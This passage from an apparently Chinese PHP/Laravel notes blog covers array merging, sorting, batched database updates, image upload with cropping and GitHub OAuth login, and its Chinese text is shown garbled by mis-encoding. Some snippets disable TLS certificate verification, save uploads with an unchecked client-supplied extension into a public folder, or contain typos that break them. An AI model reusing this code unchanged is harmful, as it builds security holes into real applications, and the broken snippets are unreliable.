class="comment">//æŒ‡å®šç±»çš„ä½œç”¨åŸŸä¸º Dog å¯¹è±¡</span></span><br><span class="line">$sayDogName = Closure::bind($sayName, <span class="keyword">new</span> Dog, <span class="string">'Dog'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡º â€œæ—ºè´¢â€</span></span><br><span class="line">$sayDogName();</span><br></pre></td></tr></table></figure>
<h3 id="æ•°ç»„æ•´åˆåˆå¹¶"><a href="#æ•°ç»„æ•´åˆåˆå¹¶" class="headerlink" title="æ•°ç»„æ•´åˆåˆå¹¶"></a>æ•°ç»„æ•´åˆåˆå¹¶</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$a=[</span><br><span class="line">   [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">"name"</span>=&gt; <span class="string">"std_name_0"</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt;<span class="number">2</span>,</span><br><span class="line">        <span class="string">"name"</span>=&gt; <span class="string">"std_name_1"</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">3</span>,</span><br><span class="line">        <span class="string">"name"</span>=&gt;<span class="string">"std_name_2"</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">4</span>,</span><br><span class="line">        <span class="string">"name"</span>=&gt; <span class="string">"std_name_3"</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">5</span>,</span><br><span class="line">        <span class="string">"name"</span>=&gt; <span class="string">"std_name_4"</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">$b=[</span><br><span class="line">[</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">2</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt;<span class="number">0</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">3</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt; <span class="number">2</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt;<span class="number">4</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt; <span class="number">4</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">5</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt;<span class="number">6</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">6</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt; <span class="number">8</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">7</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt; <span class="number">10</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt;<span class="number">8</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt; <span class="number">12</span></span><br><span class="line">    ]</span><br><span class="line">]</span><br><span class="line">$users_info=[];</span><br><span class="line">foreach ($a <span class="keyword">as</span> $val)&#123;</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'id'</span>] = $val[<span class="string">'id'</span>];</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'name'</span>] = $val[<span class="string">'name'</span>];</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'order_count'</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach ($b <span class="keyword">as</span> $val)&#123;</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'id'</span>] = $val[<span class="string">'id'</span>];</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'order_count'</span>] = $val[<span class="string">'order_count'</span>];</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'name'</span>] = $users_info[$val[<span class="string">'id'</span>]][<span class="string">'name'</span>]??<span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;&gt; $users_info</span><br><span class="line">=&gt; [</span><br><span class="line">     <span class="number">1</span> =&gt; [</span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">1</span>,</span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"std_name_0"</span>,</span><br><span class="line">       <span class="string">"order_count"</span> =&gt; <span class="number">0</span>,</span><br><span class="line">     ],</span><br><span class="line">     <span class="number">2</span> =&gt; [</span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">2</span>,</span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"std_name_1"</span>,</span><br><span class="line">       <span class="string">"order_count"</span> =&gt; <span class="number">0</span>,</span><br><span class="line">     ],</span><br><span class="line">     <span class="number">3</span> =&gt; [</span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">3</span>,</span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"std_name_2"</span>,</span><br><span class="line">       <span class="string">"order_count"</span> =&gt; <span class="number">2</span>,</span><br><span class="line">     ],</span><br><span class="line">     <span class="number">4</span> =&gt; [</span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">4</span>,</span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"std_name_3"</span>,</span><br><span class="line">       <span class="string">"order_count"</span> =&gt; <span class="number">4</span>,</span><br><span class="line">     ],</span><br><span class="line">https:<span class="comment">//www.guaosi.com/2018/12/14/complex-two-dimensional-arrays/</span></span><br></pre></td></tr></table></figure>
<h3 id="å¾ªç¯ä¸­æŸ¥è¯¢æ•°æ®åº“"><a href="#å¾ªç¯ä¸­æŸ¥è¯¢æ•°æ®åº“" class="headerlink" title="å¾ªç¯ä¸­æŸ¥è¯¢æ•°æ®åº“"></a>å¾ªç¯ä¸­æŸ¥è¯¢æ•°æ®åº“</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">foreach ( $product <span class="keyword">as</span> $p) &#123;</span><br><span class="line">       <span class="comment">//å¦‚æœå­˜åœ¨åˆ™æ›´æ–°</span></span><br><span class="line">       <span class="keyword">if</span> ( $<span class="keyword">this</span>-&gt;count($p) ) &#123;</span><br><span class="line">           $<span class="keyword">this</span>-&gt;update($p);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           $<span class="keyword">this</span>-&gt;insert($p);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">     $product = [</span><br><span class="line">           [</span><br><span class="line">               <span class="string">'product_id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">               <span class="string">'pnid'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">               <span class="string">'pvid'</span>=&gt;<span class="number">10</span></span><br><span class="line">           ],</span><br><span class="line">           [</span><br><span class="line">               <span class="string">'product_id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">               <span class="string">'pnid'</span>=&gt;<span class="number">3</span>,</span><br><span class="line">               <span class="string">'pvid'</span>=&gt;<span class="number">30</span></span><br><span class="line">           ],</span><br><span class="line">           [</span><br><span class="line">               <span class="string">'product_id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">               <span class="string">'pnid'</span>=&gt;<span class="number">12</span>,</span><br><span class="line">               <span class="string">'pvid'</span>=&gt;<span class="number">21</span></span><br><span class="line">           ],</span><br><span class="line">           [</span><br><span class="line">               <span class="string">'product_id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">               <span class="string">'pnid'</span>=&gt;<span class="number">31</span>,</span><br><span class="line">               <span class="string">'pvid'</span>=&gt;<span class="number">33</span></span><br><span class="line">           ],</span><br><span class="line">       ];</span><br><span class="line">   </span><br><span class="line">       <span class="comment">//è·å–product_idä¸º1çš„æ•°æ®</span></span><br><span class="line">       $oldData = $<span class="keyword">this</span>-&gt;get(<span class="number">1</span>);</span><br><span class="line">   </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">       * è¿™é‡Œä¼šæŠŠæ•°æ®ç»„æˆä»¥pnidä¸ºé”®çš„æ•°ç»„</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">       $oldKeyData = array_column($oldData,NULL,<span class="string">'pnid'</span>);</span><br><span class="line">   </span><br><span class="line">       $update = [];</span><br><span class="line">       $insert = [];</span><br><span class="line">   </span><br><span class="line">       foreach ( $product <span class="keyword">as</span> $p) &#123;</span><br><span class="line">           <span class="keyword">if</span> ( isset($oldKeyData[$p[<span class="string">'pnid'</span>]]) ) &#123;</span><br><span class="line">               $updatep[] = $p;</span><br><span class="line">           &#125; eles &#123;</span><br><span class="line">               $insert[] = $p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       <span class="comment">//è¿›è¡Œæ›´æ–°å’Œåˆ é™¤https://learnku.com/articles/29764</span></span><br></pre></td></tr></table></figure>
<h3 id="jsonæ’åº"><a href="#jsonæ’åº" class="headerlink" title="jsonæ’åº"></a>jsonæ’åº</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">array:<span class="number">5</span> [</span><br><span class="line">  <span class="number">6</span> =&gt; <span class="string">"ä¸­å›½"</span></span><br><span class="line">  <span class="number">5</span> =&gt; <span class="string">"ç¾å›½"</span></span><br><span class="line">  <span class="number">4</span> =&gt; <span class="string">"æ—¥æœ¬"</span></span><br><span class="line">  <span class="number">1</span> =&gt; <span class="string">"ä¿„ç½—æ–¯"</span></span><br><span class="line">  <span class="number">2</span> =&gt; <span class="string">"è‹±å›½"</span></span><br><span class="line">]</span><br><span class="line"> <span class="keyword">return</span> Response::send(<span class="number">0</span>,<span class="string">'æˆåŠŸï¼'</span>,$data);</span><br><span class="line">data    &#123;â€¦&#125;</span><br><span class="line"><span class="number">1</span>   ä¿„ç½—æ–¯</span><br><span class="line"><span class="number">2</span>   è‹±å›½</span><br><span class="line"><span class="number">4</span>   æ—¥æœ¬</span><br><span class="line"><span class="number">5</span>   ç¾å›½</span><br><span class="line"><span class="number">6</span>   ä¸­å›½</span><br><span class="line">æ¯ä¸ªæ•°å­— key å‰é¢åŠ ä¸ªç©ºæ ¼å­—ç¬¦ä¸²å³å¯ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="æ•°ç»„æ’åº"><a href="#æ•°ç»„æ’åº" class="headerlink" title="æ•°ç»„æ’åº"></a>æ•°ç»„æ’åº</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_multisort(array_column($array,<span class="string">'sort'</span>),SORT_ASC,$array);</span><br></pre></td></tr></table></figure>
<h3 id="å›¾ç‰‡ä¸Šä¼ æ·»åŠ è‡ªåŠ¨è£å‰ª"><a href="#å›¾ç‰‡ä¸Šä¼ æ·»åŠ è‡ªåŠ¨è£å‰ª" class="headerlink" title="å›¾ç‰‡ä¸Šä¼ æ·»åŠ è‡ªåŠ¨è£å‰ª"></a>å›¾ç‰‡ä¸Šä¼ æ·»åŠ è‡ªåŠ¨è£å‰ª</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> intervention/image</span><br><span class="line"></span><br><span class="line">Intervention\Image\ImageServiceProvider::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">'<span class="title">Image</span>' </span>=&gt; Intervention\Image\Facades\Image::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">php artisan vendor:publish --provider="Intervention\Image\ImageServiceProviderLaravel5"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">image_upload</span>(<span class="params">Request $req</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ($req-&gt;isMethod(<span class="string">'POST'</span>)) &#123;</span><br><span class="line">$file = $req-&gt;file(<span class="string">'file'</span>);</span><br><span class="line"><span class="comment">// å›¾ç‰‡å®½åº¦å‚æ•° å¯ä»¥å†™æ­»ä¹Ÿå¯ä¼ å€¼æ¥æ”¶ å…³é—­ false</span></span><br><span class="line">$max_width = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> ($file-&gt;isValid()) &#123;</span><br><span class="line">$realPath = $file-&gt;getRealPath ();<span class="comment">// ä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"></span><br><span class="line">    $entension = $file-&gt;getClientOriginalExtension();<span class="comment">//ä¸Šä¼ æ–‡ä»¶åç¼€å</span></span><br><span class="line">    $time = date(<span class="string">'Ym'</span>);</span><br><span class="line">    $newName = md5(uniqid(microtime(<span class="literal">true</span>), <span class="literal">true</span>)) . date(<span class="string">'YmdHis'</span>) . <span class="string">'.'</span> . $entension;</span><br><span class="line">    $path = $file-&gt;move(base_path() . <span class="string">'/public/upload/image/'</span> . $time, $newName);</span><br><span class="line">    $filepath = <span class="string">'/upload/image/'</span> . $time . <span class="string">'/'</span> . $newName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å›¾ç‰‡ç‰©ç†è·¯å¾„  ç‰¹åˆ«é‡è¦ å¦‚æœè·¯å¾„åˆ™æ— æ³•è¯†åˆ«å†™å…¥å›¾ç‰‡</span></span><br><span class="line">    $img = public_path().<span class="string">'/'</span>.$filepath;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  å›¾ç‰‡å‰ªè£é€»è¾‘  å¦‚æœé™åˆ¶äº†å›¾ç‰‡å®½åº¦ä¸”ä¸ä¸ºgifæ ¼å¼ï¼Œå°±è¿›è¡Œè£å‰ª</span></span><br><span class="line">    <span class="keyword">if</span> ($max_width &amp;&amp; $entension != <span class="string">'gif'</span>) &#123;</span><br><span class="line">        <span class="comment">// æ­¤ç±»ä¸­å°è£…çš„å‡½æ•°ï¼Œç”¨äºè£å‰ªå›¾ç‰‡</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;reduceSize($img, $max_width);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response()-&gt;json([<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'ä¸Šä¼ æˆåŠŸ'</span>, <span class="string">'filepath'</span> =&gt; $filepath]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;doFailure($e);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å›¾ç‰‡æŒ‰å®½åº¦å‰ªè£</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">reduceSize</span>(<span class="params">$img, $max_width</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// å…ˆå®ä¾‹åŒ–ï¼Œä¼ å‚æ˜¯æ–‡ä»¶çš„ç£ç›˜ç‰©ç†è·¯å¾„</span></span><br><span class="line"></span><br><span class="line">$image = Image::make($img);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿›è¡Œå¤§å°è°ƒæ•´çš„æ“ä½œ</span></span><br><span class="line">$image-&gt;resize($max_width, <span class="literal">null</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$constraint</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾å®šå®½åº¦æ˜¯ $max_widthï¼Œé«˜åº¦ç­‰æ¯”ä¾‹åŒæ–¹ç¼©æ”¾</span></span><br><span class="line">$constraint-&gt;aspectRatio();</span><br><span class="line"></span><br><span class="line"><span class="comment">// é˜²æ­¢è£å›¾æ—¶å›¾ç‰‡å°ºå¯¸å˜å¤§</span></span><br><span class="line">$constraint-&gt;upsize();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹å›¾ç‰‡ä¿®æ”¹åè¿›è¡Œä¿å­˜</span></span><br><span class="line">$image-&gt;save();</span><br><span class="line">&#125;<span class="string">`</span></span><br></pre></td></tr></table></figure>
<h3 id="å¿«é€Ÿæ¥å…¥-GitHub-ç™»é™†"><a href="#å¿«é€Ÿæ¥å…¥-GitHub-ç™»é™†" class="headerlink" title="å¿«é€Ÿæ¥å…¥ GitHub ç™»é™†"></a>å¿«é€Ÿæ¥å…¥ GitHub ç™»é™†</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‘é€è¯·æ±‚(ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨guzzle)</span></span><br><span class="line"><span class="comment"> *https://learnku.com/articles/29160</span></span><br><span class="line"><span class="comment"> * @param string $url      è¯·æ±‚åœ°å€</span></span><br><span class="line"><span class="comment"> * @param array $data      è¯·æ±‚æ•°æ®</span></span><br><span class="line"><span class="comment"> * @param array $headers   è¯·æ±‚å¤´</span></span><br><span class="line"><span class="comment"> * @return string|array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendRequest</span>(<span class="params">$url, $data = [], $headers = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);</span><br><span class="line">    <span class="keyword">if</span> (!empty($data)) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">60</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    $response = curl_exec($ch) ? curl_multi_getcontent($ch) : <span class="string">''</span>;</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœç”¨æˆ·åŒæ„ç™»é™†ï¼Œ github å°±ä¼šè¿”å›åˆ° callback.php å¹¶æºå¸¦ä¸€ä¸ªcodeå‚æ•°</span></span><br><span class="line"><span class="comment">// æ­¤æ—¶åªéœ€è¦ä½¿ç”¨è¿™ä¸ª code å»è·å– access_token, ç„¶ååœ¨ä½¿ç”¨ access_token è·å–ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">$url        = <span class="string">"https://github.com/login/oauth/access_token"</span>;</span><br><span class="line">$app_id     = <span class="string">"your github oauth app client_id"</span>;</span><br><span class="line">$app_secret = <span class="string">"your github oauth app client_secret"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»„åˆè¯·æ±‚å‚æ•°</span></span><br><span class="line">$code   = $_GET[<span class="string">'code'</span>];</span><br><span class="line">$params = [</span><br><span class="line">    <span class="string">'client_id'</span>     =&gt; $app_id,</span><br><span class="line">    <span class="string">'client_secret'</span> =&gt; $app_secret,</span><br><span class="line">    <span class="string">'code'</span>          =&gt; $code,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘é€è¯·æ±‚å¹¶è·å–å“åº”ä¿¡æ¯</span></span><br><span class="line">$response = sendRequest($url, $params, [<span class="string">'Accept: application/json'</span>]);</span><br><span class="line">$response = json_decode($response, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœæœ‰å“åº”ä¿¡æ¯ï¼Œ è¯´æ˜è¯·æ±‚æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> (!empty($response[<span class="string">'access_token'</span>])) &#123;</span><br><span class="line">    <span class="comment">// è¯·æ±‚æˆåŠŸï¼Œä½¿ç”¨ access_token è·å–ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">    $access_token = $response[<span class="string">'access_token'</span>];</span><br><span class="line">    $url = <span class="string">"https://api.github.com/user"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘é€è¯·æ±‚ï¼Œè°ƒå–github API è·å–ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">    $userInfo =  sendRequest($url,[],[</span><br><span class="line">        <span class="string">"Accept: application/json"</span>,</span><br><span class="line">        <span class="string">"User-Agent: ilearn"</span>,  <span class="comment">// æ­¤å¤„(ilearn)æ˜¯å¡«å†™åº”ç”¨åç§° æˆ–è€… githubç”¨æˆ·å</span></span><br><span class="line">        <span class="string">"Authorization:token &#123;$access_token&#125;"</span></span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    exit($userInfo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœç™»é™†å¤±è´¥å°±æ‰“å°é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">echo <span class="string">"&lt;p&gt;ç™»é™†å¤±è´¥&lt;/p&gt;&lt;/pre&gt;"</span>;</span><br><span class="line">var_dump($response);</span><br><span class="line">exit(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//github.com/overtrue/laravel-socialite</span></span><br><span class="line"></span><br><span class="line">ä½¿ç”¨å‘½ä»¤ composer <span class="built_in">require</span> huoshaotuzi/sociate å®‰è£…ï¼Œç°åœ¨æ”¯æŒ QQã€å¾®åšã€å¾®ä¿¡å…¬ä¼—å·ã€ç™¾åº¦ã€Github ç™»å½•ï¼Œä»¥åæœ‰æ—¶é—´è¿˜ä¼šç»§ç»­æ‰©å±•æ›´å¤šçš„ç™»å½•ã€‚https:<span class="comment">//learnku.com/laravel/t/24449</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-å®‰å…¨é—®é¢˜å…¥é—¨"><a href="#PHP-å®‰å…¨é—®é¢˜å…¥é—¨" class="headerlink" title="PHP å®‰å…¨é—®é¢˜å…¥é—¨"></a>PHP å®‰å…¨é—®é¢˜å…¥é—¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 